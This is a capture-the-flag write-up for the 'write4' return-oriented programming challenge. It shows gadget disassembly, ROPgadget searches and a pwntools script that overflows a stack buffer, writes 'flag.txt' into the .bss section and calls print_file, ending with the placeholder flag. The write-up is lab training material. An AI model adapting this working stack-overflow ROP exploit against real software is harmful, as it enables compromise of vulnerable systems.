# Writeup: write4

## Introduction

This challenge instructs us to write the relevant string to the binary and then call the print_file function to print out the flag. To do this we will be taking advantage of the same vulnerability in the callme CTF located in the pwn me function by writing to the local function stack by overflowing the buffer to overwrite the return address with a ROP chain. 


## Dissasembly

### Useful Gadgets Function

```
    0x0000000000400628 <+0>:     mov    QWORD PTR [r14],r15
    0x000000000040062b <+3>:     ret
    0x000000000040062c <+4>:     nop    DWORD PTR [rax+0x0]
``` 

As you can see here we have a gadget that will allow us to write to memory specifically write the contents of r15 to the memory location of R14.

## ROP Gadget Lookup

Since we have the memory writing gadget now we need to find gadgets that will allow us to pass the string into the function print file from the memory location r14 and also fill the register r15 with the string so that we can pass it along the chain to the print file function. The gadgets that we will need are: pop r14 ; pop r15 ; ret, mov    QWORD PTR [r14],r15 ; ret, and pop rdi ; ret. I was able to find all of them using ROPgadget.

### POP R14 ; POP R15

```
    $ ROPgadget --binary ./write4 | grep "pop r14"
    0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
    0x0000000000400690 : pop r14 ; pop r15 ; ret
    0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
    0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
``` 

### MOV QWORD PTR [r14], r15

```
    $ ROPgadget --binary ./write4 | grep "mov"
    0x00000000004005fc : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
    0x00000000004005fd : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400590
    0x00000000004005fe : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
    0x00000000004005ff : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400590
    0x000000000040061a : in eax, 0xbf ; mov ah, 6 ; add al, bpl ; jmp 0x400621
    0x0000000000400579 : je 0x400588 ; pop rbp ; mov edi, 0x601038 ; jmp rax
    0x00000000004005bb : je 0x4005c8 ; pop rbp ; mov edi, 0x601038 ; jmp rax
    0x000000000040061c : mov ah, 6 ; add al, bpl ; jmp 0x400621
    0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
    0x0000000000400629 : mov dword ptr [rsi], edi ; ret
    0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
    0x0000000000400602 : mov ebp, esp ; pop rbp ; jmp 0x400590
    0x000000000040057c : mov edi, 0x601038 ; jmp rax
    0x0000000000400628 : mov qword ptr [r14], r15 ; ret
    0x0000000000400601 : mov rbp, rsp ; pop rbp ; jmp 0x400590
    0x000000000040057b : pop rbp ; mov edi, 0x601038 ; jmp rax
    0x0000000000400600 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
```

### POP RDI

```
    $ ROPgadget --binary ./write4 | grep "pop rdi"
    0x0000000000400693 : pop rdi ; ret
```

## Results

Now that we have everything we can adjust the script from the last CTF to adapt to the new challenge.

```
    from pwn import *

    context.arch = 'amd64'
    p = process('./write4')
    e = ELF('./write4')

    p.recvuntil(b'> ')

    rop = ROP(e)
    bss = e.bss()
    MOV = 0x0000000000400628 # mov qword ptr [r14], r15 ; ret
    POP_R14R15 = 0x0000000000400690 # pop r14 ; pop r15 ; ret
    POP_RDI = 0x0000000000400693 # pop rdi ; ret
    padding = b'A' * 40
    text = b'flag.txt'
    print_file = e.sym['print_file']
    payload = padding + p64(POP_R14R15) + p64(bss) + p64(u64(text)) + p64(MOV) + p64(POP_RDI) + p64(bss) + p64(print_file)
    p.sendline(payload)
    p.interactive()
```

I mentioned earlier we were going to have to write the required text to the binary somehow. The way I was able to write it was by writing it to the bss section of the binary and then moving the address of the bss section into r14 that way when we mov the contents of r15 to the memory location stored at r14 we would be writing to the binary and be able tp reference it later on in the chain and pop it into rdi allowing us to call the print_file function properly. Now all that is left to do is to run the script and get the flag.

```
    [+] Starting local process './write4': pid 52222
    [*] '/mnt/c/Users/18506/Desktop/CTF/write4/write4'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        RUNPATH:  b'.'
    [*] Loaded 13 cached gadgets for './write4'
    [*] Switching to interactive mode
    Thank you!
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive
    $
    [*] Process './write4' stopped with exit code -11 (SIGSEGV) (pid 52222)
    [*] Got EOF while sending in interactive
```

Finally, we have the flag:

`ROPE{a_placeholder_32byte_flag!}`
